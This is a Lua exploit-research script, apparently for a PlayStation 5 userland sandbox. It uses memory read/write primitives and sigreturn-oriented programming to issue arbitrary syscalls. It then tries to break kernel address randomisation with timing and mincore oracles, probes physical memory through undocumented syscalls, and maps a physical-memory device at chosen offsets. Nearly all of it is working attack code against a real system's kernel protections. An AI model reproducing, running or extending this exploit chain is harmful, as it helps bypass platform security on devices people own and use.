-- CRASH_CLASS: MODERATE
-- PROBE 152a: KASLR timing oracle via SROP + thread suspend/resume
--
-- Theory: use SROP to call sysctl with different kernel-address-shaped
-- values as pointers. Invalid kernel addresses should fault differently
-- than valid ones. Even if the call returns -1 either way, the TIMING
-- of the return may differ: a page-table walk that hits a valid PTE
-- takes longer than one that faults immediately at the top-level.
--
-- We also test: can we use mincore(78) or access patterns to distinguish
-- mapped from unmapped kernel pages via timing alone?
--
-- Additionally: test sys 637 set_phys_fmem_limit with value 0 to see
-- if it reveals current physical memory usage (it blocks when value < usage).

print("=== PROBE 152a: KASLR TIMING ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Timing oracle: use sys 624 (VM op counter) as a timer
-- Call sysctl(202) with a kernel-address buffer and measure VM op delta
print("--- [A] SYSCTL TIMING WITH KERNEL BUFFER ---")

local function get_vm_count()
    local rv = srop(624)
    return rv and to_num(rv) or -1
end

local base_vm = get_vm_count()
print("baseline_vm_ops=" .. base_vm)

-- Test addresses at various kernel offsets
-- FreeBSD kernel typically loads at 0xFFFFFFFF80000000 + KASLR slide
-- PS5 has 16KB pages so slides are 0x4000-aligned
local test_addrs = {
    "0xFFFF800000000000",  -- lowest possible kernel VA
    "0xFFFF800100000000",  -- +4GB
    "0xFFFF800200000000",  -- +8GB
    "0xFFFF820000000000",  -- well above base
    "0xFFFFFFFF80000000",  -- typical FreeBSD kernel base (no slide)
    "0xFFFFFFFF80200000",  -- +2MB
    "0xFFFFFFFF81000000",  -- +16MB
    "0xFFFFFFFF82000000",  -- +32MB
    "0xFFFFFFFF84000000",  -- +64MB
}

local mib = gpu + 0x10000
local outbuf = gpu + 0x10100
local oldlenp = gpu + 0x10200

for _, addr_str in ipairs(test_addrs) do
    -- sysctl kern.ostype (1.1) with output buffer pointing to kernel space
    wd(mib, 1)      -- CTL_KERN
    wd(mib + 4, 1)  -- KERN_OSTYPE
    wd(oldlenp, 256)

    local vm_before = get_vm_count()
    local ret = srop(202, ga(0x10000), uint64(2), uint64(addr_str), ga(0x10200), uint64(0), uint64(0))
    local vm_after = get_vm_count()
    local rv = ret and to_num(ret) or -999
    local delta = vm_after - vm_before

    print("addr=" .. addr_str .. " ret=" .. rv .. " vm_delta=" .. delta)
end

-- [B] mincore oracle: does mincore return differently for valid kernel pages?
print("")
print("--- [B] MINCORE KERNEL ADDRESS PROBE ---")

local vec = gpu + 0x11000
for _, addr_str in ipairs(test_addrs) do
    wd(vec, 0xDD)
    local ret = srop(78, uint64(addr_str), uint64(0x4000), ga(0x11000))
    local rv = ret and to_num(ret) or -999
    local vbyte = to_num(memory.read_dword(vec))
    print("addr=" .. addr_str .. " ret=" .. rv .. " vec=0x" .. string.format("%02X", vbyte))
end

-- [C] sys 637 set_phys_fmem_limit probing
-- With target=0 (own process), the value is stored at parent+0x200->child+0x280
-- Values BELOW current phys usage will block, values above return 0
-- This gives us a binary search for the process's physical memory footprint
print("")
print("--- [C] SYS 637 PHYS MEMORY PROBE ---")

-- First, read what value is there now via srop
-- Try large values first (should return 0 immediately)
local test_limits = {
    0x100000000,  -- 4GB
    0x80000000,   -- 2GB
    0x40000000,   -- 1GB
    0x20000000,   -- 512MB
    0x10000000,   -- 256MB
    0x08000000,   -- 128MB
    0x04000000,   -- 64MB
    0x02000000,   -- 32MB
    0x01000000,   -- 16MB
    0x00800000,   -- 8MB
    0x00400000,   -- 4MB
    0x00200000,   -- 2MB
    0x00100000,   -- 1MB
}

for _, limit in ipairs(test_limits) do
    local vm_before = get_vm_count()
    local lh = math.floor(limit / 0x100000000)
    local ll = limit % 0x100000000
    local addr_u = uint64(string.format("0x%X%08X", lh, ll))

    -- 637(0, limit) — target=0 means own process
    local ret = srop(637, uint64(0), addr_u)
    local vm_after = get_vm_count()
    local rv = ret and to_num(ret) or -999

    print("limit=" .. string.format("0x%X", limit) .. " ret=" .. rv .. " vm_delta=" .. (vm_after - vm_before))

    -- If ret is nil/timeout that means it blocked (value < current usage)
    if rv == -999 then
        print("  *** BLOCKED (limit < current phys usage) ***")
        break
    end
end

-- [D] Timing differences via getnanouptime-style measurement
-- sys 116 = gettimeofday, or we can use the VM counter as a coarse timer
-- Try reading from physhm fd if available
print("")
print("--- [D] PHYSHM MAP AT DIFFERENT OFFSETS ---")

-- Open physhm: 629(1, 2, 0, 0)
local phm_fd = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local pfd = phm_fd and to_num(phm_fd) or -1
print("physhm_fd=" .. pfd)

if pfd >= 0 then
    -- Try mapping at different physical offsets
    local test_offsets = {0, 0x4000, 0x10000, 0x100000, 0x1000000, 0x10000000}

    for _, off in ipairs(test_offsets) do
        local oh = math.floor(off / 0x100000000)
        local ol = off % 0x100000000
        local off_u = uint64(string.format("0x%X%08X", oh, ol))

        -- mmap(0, 0x4000, PROT_READ, MAP_SHARED, fd, offset)
        local mp = srop(477, uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(pfd), off_u)
        local mph, mpl = get_hi_lo(mp)

        if mph ~= 0xFFFFFFFF then
            print("off=0x" .. string.format("%X", off) .. " mmap=0x" .. string.format("%X%08X", mph, mpl))
            -- Don't try to read it — 321a showed it kills the process
            -- But the fact that mmap succeeds at this offset tells us SOMETHING
            srop(73, mp, uint64(0x4000))  -- munmap
        else
            print("off=0x" .. string.format("%X", off) .. " mmap=-1")
        end
    end

    srop(6, uint64(pfd))
end

-- [E] Clock-based timing: measure nanosleep round-trip as baseline,
-- then measure syscall timing with different args
print("")
print("--- [E] SYSCALL TIMING COMPARISON ---")

-- Use gettimeofday(116) as timer
local tv = gpu + 0x12000
local function get_usec()
    srop(116, ga(0x12000))
    local sec_lo = to_num(memory.read_dword(tv))
    local usec = to_num(memory.read_dword(tv + 8))
    return sec_lo * 1000000 + usec
end

-- Measure 10 rounds of sysctl with valid vs bogus buffer to calibrate
local valid_times = {}
local bogus_times = {}

for i = 1, 10 do
    wd(mib, 1); wd(mib + 4, 1)  -- kern.ostype
    wd(oldlenp, 256)

    local t1 = get_usec()
    srop(202, ga(0x10000), uint64(2), ga(0x10100), ga(0x10200), uint64(0), uint64(0))
    local t2 = get_usec()
    valid_times[i] = t2 - t1

    -- Now with a kernel address as output buffer (should fail with EFAULT)
    wd(oldlenp, 256)
    local t3 = get_usec()
    srop(202, ga(0x10000), uint64(2), uint64("0xFFFFFFFF81000000"), ga(0x10200), uint64(0), uint64(0))
    local t4 = get_usec()
    bogus_times[i] = t4 - t3
end

local avg_valid = 0
local avg_bogus = 0
for i = 1, 10 do
    avg_valid = avg_valid + valid_times[i]
    avg_bogus = avg_bogus + bogus_times[i]
end
avg_valid = avg_valid / 10
avg_bogus = avg_bogus / 10

print("avg_valid_us=" .. string.format("%.1f", avg_valid))
print("avg_bogus_us=" .. string.format("%.1f", avg_bogus))
print("ratio=" .. string.format("%.3f", avg_bogus / avg_valid))

-- If there's a timing difference, scan more addresses
if math.abs(avg_bogus - avg_valid) > 5 then
    print("*** TIMING DIFFERENCE DETECTED ***")
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
